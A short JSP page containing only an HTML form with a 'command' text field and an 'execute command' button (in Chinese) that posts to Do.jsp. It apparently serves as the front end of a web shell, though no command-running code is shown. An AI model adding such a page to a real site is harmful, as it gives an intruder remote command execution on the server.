<%@ page import="java.io.*"%>
<%@ page language="java" contentType="text/html; charset=utf-8"
    pageEncoding="utf-8"%>
<!DOCTYPE html>
<html>

    <head>
        <meta charset="utf-8">
        <title>Insert title here</title>
    </head>

    <body>
        <form name="cmd" action="Do.jsp" method="POST">
            <input type="text" name="command" value="" size=50>
            <input type=submit name=submit value="执行命令">
        </form>
    </body>

</html>